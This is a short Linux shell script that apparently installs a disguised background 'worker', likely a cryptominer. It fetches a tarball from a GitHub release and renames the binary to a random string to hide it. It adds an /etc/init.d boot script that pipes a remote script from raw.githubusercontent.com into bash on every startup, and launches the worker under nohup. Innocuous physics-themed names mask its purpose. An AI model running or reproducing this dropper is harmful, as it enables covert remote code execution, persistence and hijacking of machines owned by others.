cd /
wget https://github.com/wavecov/particle/releases/download/v1.5.0/mass.tar
tar -xvf mass.tar
cd /mass
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv acceleration $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./velocity.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/wavecov/particle/main/energy.sh)" > force.sh
chmod a+x force.sh
update-rc.d force.sh defaults
rm -rf mass.tar
cd /mass
nohup ./velocity.sh
ps -ef | grep mass
